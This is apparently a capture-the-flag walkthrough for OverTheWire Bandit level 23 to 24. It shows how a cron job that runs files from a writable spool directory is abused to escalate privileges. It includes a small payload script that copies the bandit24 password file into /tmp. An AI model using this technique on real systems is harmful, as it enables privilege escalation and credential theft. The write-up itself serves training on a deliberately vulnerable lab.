## Bandit Level 23 → Level 24

### Goal
Gain access to the next level by abusing a cron job that automatically executes user-controlled scripts and leaks the password for bandit24.

### Task Analysis
A cron job runs every minute as user bandit24 and executes the following script:

/usr/bin/cronjob_bandit24.sh

The script:
- Changes directory to /var/spool/bandit24/foo
- Executes every file in that directory
- Only runs files owned by bandit23
- Deletes each file after execution

This means I can place my own script in that directory, have it executed with bandit24 privileges, and extract the password.

### Approach
1. Inspect the cron configuration in /etc/cron.d
2. Analyze the executed script to understand execution conditions
3. Create a shell script that copies the bandit24 password to a readable location
4. Ensure correct ownership and executable permissions
5. Place the script in the cron execution directory
6. Wait for cron to execute it and read the password

### Solution
```bash
# inspect cron job
cd /etc/cron.d
cat cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh

# create temporary working directory
mktemp -d
cd /tmp/tmp.mac2Nvci2S

# create payload script
vim pass.sh
```

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
```

```bash
# make script executable
chmod 755 pass.sh

# copy script to cron execution directory
cp pass.sh /var/spool/bandit24/foo/

# wait for cron execution, then read password
cat /tmp/bandit24_pass
```

### What I Learned
- How cron jobs execute scripts automatically
- How writable cron directories can be abused
- How privilege escalation can occur via scheduled tasks
- Why file ownership and permissions are critical for execution
- How cron cleanup behavior affects payload design
